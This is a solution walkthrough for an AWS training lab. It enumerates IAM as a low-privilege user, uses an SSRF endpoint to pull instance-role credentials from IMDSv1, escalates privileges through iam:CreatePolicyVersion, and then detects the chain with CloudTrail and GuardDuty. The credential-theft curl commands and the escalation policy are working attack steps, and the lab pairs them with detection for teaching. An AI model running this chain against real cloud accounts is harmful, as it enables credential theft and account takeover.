# Day 18 Lab — Solution / Full Walkthrough

## Authorized use only

Same notice as [`README.md`](README.md): every command below runs only
against resources `setup.sh` created in your own AWS sandbox account. Try
each stage yourself, using `content/day18-cloud-lab.md`'s hints ladder,
before reading this file.

## Before you start

All commands assume `setup.sh` already ran and you're in `labs/day18/`.
Two identity contexts are used throughout — keep them straight, since mixing
them up is the single most common way to get a confusing `AccessDenied`
that isn't actually the lab being broken:

- **Your own profile** (`--profile <your-aws-profile>`) — used only to *set
  up and tear down* the lab, and to compare against Stage 4's "wrong" answer.
  Never used for the actual attack stages below.
- **`day18-learner`** — the low-privilege entry-point identity for Stage 1,
  loaded via the env vars from `aws-credentials-day18.txt`.
- **The stolen `day18-app-role` temporary credentials** — obtained mid-way
  through Stage 2, used for Stages 2's final read and all of Stage 3. These
  are session credentials (`AccessKeyId` starting `ASIA...`, plus a
  `SessionToken`) — different in kind from `day18-learner`'s long-lived
  access key.

Read the values you need out of `.day18-state.env`:

```sh
source .day18-state.env
echo "$PUBLIC_IP $BUCKET_NAME $FLAG_KEY $ROLE_NAME $APP_POLICY_ARN"
```

## Stage 1 — Enumerate as `day18-learner`

Load the low-priv identity:

```sh
export AWS_ACCESS_KEY_ID=$(grep AWS_ACCESS_KEY_ID aws-credentials-day18.txt | cut -d= -f2)
export AWS_SECRET_ACCESS_KEY=$(grep AWS_SECRET_ACCESS_KEY aws-credentials-day18.txt | cut -d= -f2)
unset AWS_SESSION_TOKEN
aws --region us-east-1 sts get-caller-identity
```

**Expected:** an `Arn` ending in `user/day18-learner`.

Find the target instance and its attached role:

```sh
aws --region us-east-1 ec2 describe-instances \
  --filters "Name=tag:Name,Values=day18-ssrf-target" \
  --query 'Reservations[0].Instances[0].[InstanceId,PublicIpAddress,IamInstanceProfile.Arn]' \
  --output text
```

**Expected:** the instance ID, its public IP, and an instance-profile ARN
naming `day18-app-instance-profile`. The instance profile ARN tells you the
*profile* name, not the role name directly — but this lab names the role the
same way (`day18-app-role`) and the enumeration policy lets you confirm it
directly:

```sh
aws --region us-east-1 iam get-role --role-name day18-app-role \
  --query 'Role.Arn' --output text
aws --region us-east-1 iam list-attached-role-policies --role-name day18-app-role
```

**Expected:** the role's ARN, and one attached policy: `day18-app-policy`.
Read what it actually grants:

```sh
POLICY_ARN=$(aws --region us-east-1 iam list-attached-role-policies \
  --role-name day18-app-role --query 'AttachedPolicies[0].PolicyArn' --output text)
VERSION_ID=$(aws --region us-east-1 iam get-policy --policy-arn "$POLICY_ARN" \
  --query 'Policy.DefaultVersionId' --output text)
aws --region us-east-1 iam get-policy-version --policy-arn "$POLICY_ARN" \
  --version-id "$VERSION_ID" --query 'PolicyVersion.Document' --output json
```

**Expected:** three statements — `s3:GetObject` on one specific S3 object,
`sts:GetCallerIdentity`, and (the important one) `iam:CreatePolicyVersion` /
`iam:GetPolicy` / `iam:GetPolicyVersion` / `iam:ListPolicyVersions` **scoped to
the policy's own ARN**. This is Stage 1's actual payoff: you now know, purely
from read-only enumeration as a low-privilege user, that *whoever holds
`day18-app-role`'s credentials* can grant themselves anything, by editing
their own policy. `day18-learner` itself cannot do any of this directly — try
it and confirm the denial:

```sh
aws --region us-east-1 s3 ls "s3://$(grep BUCKET_NAME .day18-state.env | cut -d= -f2)/"
```

**Expected:** `AccessDenied`. `day18-learner`'s own policy grants no S3
permissions at all — confirming the enumeration found a real gap between
"can read the policy" and "can use what the policy grants."

**Proof of access, Stage 1:** you can name the exact IAM action
(`iam:CreatePolicyVersion`) and the exact resource (`day18-app-policy`'s own
ARN) that make this role's credentials worth stealing, before stealing them.

## Stage 2 — SSRF → IMDS → steal the role's temporary credentials

The target's `/fetch?url=` endpoint (planted by `setup.sh`'s user-data,
`/opt/day18/app.py`) makes an unrestricted server-side request to whatever
URL you give it — the exact SSRF class from Day 9, now pointed at Day 15's
target: the instance metadata service.

```sh
PUBLIC_IP=$(grep PUBLIC_IP .day18-state.env | cut -d= -f2)
curl -s "http://${PUBLIC_IP}:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Expected:** `day18-app-role` — IMDS lists the one role name attached to the
instance profile.

```sh
curl -s "http://${PUBLIC_IP}:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/day18-app-role"
```

**Expected:** a JSON document with `AccessKeyId`, `SecretAccessKey`,
`Token`, and `Expiration`. This works with **no token, no header, nothing
beyond a plain GET** — the exact IMDSv1 weakness `setup.sh` deliberately left
enabled (`HttpTokens=optional`). IMDSv2 (`HttpTokens=required`) would have
required a `PUT` first, with a custom header, to obtain a session token
before any metadata GET succeeds — and critically, the SSRF app here can only
issue simple `GET`s via `urllib.request.urlopen`, so it has no way to perform
that `PUT` step at all. **Enforcing IMDSv2 alone would have stopped this
entire stage** — see the Defense note in `content/day18-cloud-lab.md`.

Load the stolen credentials:

```sh
CREDS=$(curl -s "http://${PUBLIC_IP}:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/day18-app-role")
export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .Token)
aws --region us-east-1 sts get-caller-identity
```

**Expected:** an `Arn` naming `assumed-role/day18-app-role/i-<instance-id>` —
confirming these are temporary, role-session credentials, not a static IAM
user's keys. Note the `AccessKeyId` starts with `ASIA` (session credentials)
where `day18-learner`'s started with `AKIA` (long-lived) — this distinction
matters directly in Stage 4's detection.

Read the flag now that you hold the role's own credentials:

```sh
BUCKET_NAME=$(grep BUCKET_NAME .day18-state.env | cut -d= -f2)
FLAG_KEY=$(grep FLAG_KEY .day18-state.env | cut -d= -f2)
aws --region us-east-1 s3 cp "s3://${BUCKET_NAME}/${FLAG_KEY}" -
```

**Proof of access, Stage 2 (Flag 1):** the flag string prints
(`day18-flag1-...`) — readable now purely because you're using
`day18-app-role`'s credentials, stolen entirely off-instance via SSRF, never
touching the EC2 instance's own shell.

## Stage 3 — Escalate: grant the stolen role's creds more than they started with

Stage 1 already told you which policy to target. Using the **stolen role
credentials** still exported from Stage 2:

```sh
APP_POLICY_ARN=$(grep APP_POLICY_ARN .day18-state.env | cut -d= -f2)

# Confirm today's baseline denial first (the "before" of a before/after proof):
aws --region us-east-1 iam list-users 2>&1 | tail -1
```

**Expected:** `AccessDenied` — `day18-app-policy`'s original statements never
granted `iam:ListUsers`.

```sh
cat > /tmp/day18-escalated-policy.json <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ReadTheFlag",
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "*"
    },
    {
      "Sid": "WhoAmI",
      "Effect": "Allow",
      "Action": "sts:GetCallerIdentity",
      "Resource": "*"
    },
    {
      "Sid": "SelfPolicyEscalationMisconfig",
      "Effect": "Allow",
      "Action": [
        "iam:GetPolicy",
        "iam:GetPolicyVersion",
        "iam:ListPolicyVersions",
        "iam:CreatePolicyVersion"
      ],
      "Resource": "*"
    },
    {
      "Sid": "ProofOfEscalation",
      "Effect": "Allow",
      "Action": ["iam:ListUsers", "s3:ListAllMyBuckets"],
      "Resource": "*"
    }
  ]
}
EOF

aws --region us-east-1 iam create-policy-version \
  --policy-arn "$APP_POLICY_ARN" \
  --policy-document file:///tmp/day18-escalated-policy.json \
  --set-as-default
```

**Expected:** success — `day18-app-policy` grants `iam:CreatePolicyVersion` on
*itself*, so a principal holding this role's credentials can add a brand-new
default version to its own policy, deliberately widening `s3:GetObject` and
`iam:CreatePolicyVersion` to `Resource: "*"` and adding two new actions
(`iam:ListUsers`, `s3:ListAllMyBuckets`) — never granted anywhere in the
original policy. This one call is the entire Rhino-Security-style AWS privesc
class named in Day 14: **any principal that can create a new default policy
version on a policy attached to itself can grant itself arbitrary
permissions**, no `PassRole` or second role needed.

```sh
aws --region us-east-1 iam list-users --query 'Users[].UserName' --output text
```

**Proof of access, Stage 3 (Flag 2):** this now succeeds (prints
`day18-learner` at minimum), where the identical call failed moments ago
under the identical credentials — a clean before/after proving the
escalation actually worked, not just that the API call didn't error.

## Stage 4 — Detect the whole chain

Switch back to your own profile for all of Stage 4 (detection is done as the
account owner/analyst, not as either attacker identity):

```sh
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=""; export AWS_SECRET_ACCESS_KEY=""  # clear the stolen creds
# then re-authenticate as yourself, e.g.:
aws --profile <your-aws-profile> --region us-east-1 sts get-caller-identity
```

### 4a — Find the enumeration (Stage 1) in CloudTrail

CloudTrail's free 90-day **Event History** captures management events with
no trail required:

```sh
aws --profile <your-aws-profile> --region us-east-1 cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=day18-learner \
  --query 'Events[].[EventName,EventTime]' --output table
```

**Expected:** rows for `GetCallerIdentity`, `DescribeInstances`, `GetRole`,
`ListAttachedRolePolicies`, `GetPolicy`, `GetPolicyVersion` — Stage 1's exact
enumeration sequence, timestamped, all attributable to one named IAM user.
On its own, this is *normal-looking* read-only activity — the real detection
signal is what comes next.

### 4b — Find the stolen-credential usage (Stages 2–3) and the anomaly that proves theft

```sh
aws --profile <your-aws-profile> --region us-east-1 cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreatePolicyVersion \
  --query 'Events[].CloudTrailEvent' --output text | jq -r '.'
```

**Expected:** one `CreatePolicyVersion` event. Inspect its
`userIdentity.arn` and `sourceIPAddress` fields specifically:

- `userIdentity.arn` — `assumed-role/day18-app-role/i-<instance-id>`, exactly
  as expected for a call made with the instance role's credentials.
- `sourceIPAddress` — **this is the tell.** If Stage 3's call was made from
  your own laptop/workstation (as the walkthrough above has you do), this IP
  will be *your* IP, not the EC2 instance's. A legitimate call using
  `day18-app-role`'s credentials should only ever originate from that
  instance's own network path. **A role's credentials being used from a
  source IP that isn't the instance they were issued to is definitional
  evidence of credential theft** — the same signal Day 16 teaches you to
  build a detection around, and exactly what GuardDuty's
  `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`
  finding type exists to catch (or `...InsideAWS` if the theft is reused
  from a different EC2 instance within the same account/VPC rather than
  fully outside AWS).

Compare against the instance's own IP to make the mismatch concrete:

```sh
grep PUBLIC_IP .day18-state.env
```

If `sourceIPAddress` on the `CreatePolicyVersion` event does not match this
value (and it won't, if you ran Stage 3 from your own machine), that
mismatch alone — with no other context needed — is the detection.

### 4c — GuardDuty finding mapping (informational, if you still have Day 16's detector active)

This lab never creates a GuardDuty detector itself. Two of today's stages map
to two distinct finding types, matching Day 16's own mapping exactly:

- Stage 2 (SSRF → IMDS theft) → `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`
  (or `...InsideAWS` if the stolen creds were reused from a different EC2
  instance in the same account rather than fully outside AWS).
- Stage 3 (self-policy escalation via `CreatePolicyVersion`) →
  `PrivilegeEscalation:IAMUser/AdministrativePermissions`.

Real-world GuardDuty detection latency for a one-off manual replay like this
is minutes, not instant, and standing up a detector solely for this lab isn't
worth its ongoing cost. If Day 16's detector is still enabled (reused, not
recreated), Day 16's own sample-findings mechanism produces both finding
types on demand, with no live exploit required:

```sh
DETECTOR_ID=$(aws --profile <your-aws-profile> --region us-east-1 guardduty list-detectors \
  --query 'DetectorIds[0]' --output text)
aws --profile <your-aws-profile> --region us-east-1 guardduty create-sample-findings \
  --detector-id "$DETECTOR_ID" \
  --finding-types \
    "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS" \
    "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS" \
    "PrivilegeEscalation:IAMUser/AdministrativePermissions"

aws --profile <your-aws-profile> --region us-east-1 guardduty list-findings \
  --detector-id "$DETECTOR_ID" \
  --finding-criteria '{"Criterion":{"type":{"Eq":[
    "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS",
    "PrivilegeEscalation:IAMUser/AdministrativePermissions"
  ]}}}'
```

If no GuardDuty detector exists, treat 4b's manual CloudTrail correlation as
the completed detection for this lab, and name both finding types above from
memory as the "what this would alert on automatically in production" answer
— that's the actual graded skill, not the API call.

### 4d — The alerting pattern (described, not deployed in this lab)

An EventBridge rule matching `source: aws.guardduty`, `detail-type:
"GuardDuty Finding"`, filtered to `detail.type` equal to
`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` (or the
`InsideAWS` variant), targeting an SNS topic with an email/Slack subscription,
is the standard automated version of the manual correlation you just did in
4b. This lab doesn't stand up EventBridge/SNS resources (extra always-on
infrastructure for a one-shot lab isn't worth the teardown surface) — Day 16
is where you build and keep this pattern for real.

**Proof of access, Stage 4:** you can point to the specific CloudTrail field
(`sourceIPAddress` on the `CreatePolicyVersion` event) that proves the
role's credentials were used off-instance, and name the exact GuardDuty
finding type that automates catching it.

## Teardown verification — what "clean" actually looks like

After running `./teardown.sh`, its own output should show:

```
-- IAM user (expect: An error occurred (NoSuchEntity)) --
An error occurred (NoSuchEntity) when calling the GetUser operation: ...

-- IAM role (expect: An error occurred (NoSuchEntity)) --
An error occurred (NoSuchEntity) when calling the GetRole operation: ...

-- EC2 instances tagged Name=day18-ssrf-target (expect: no rows) --
(blank)

-- S3 bucket ... (expect: An error occurred (404) or NoSuchBucket) --
An error occurred (404) when calling the HeadBucket operation: ...

-- CloudTrail trails (informational...) --
(whatever trails already existed before Day 18 — should be unchanged)

-- GuardDuty detectors (informational...) --
(whatever detector state already existed before Day 18 — should be unchanged)
```

If the IAM/EC2/S3 checks show anything other than the "expect" lines above,
teardown didn't fully complete — re-run `./teardown.sh` (it tolerates
resources that are already gone) before considering the lab closed out.
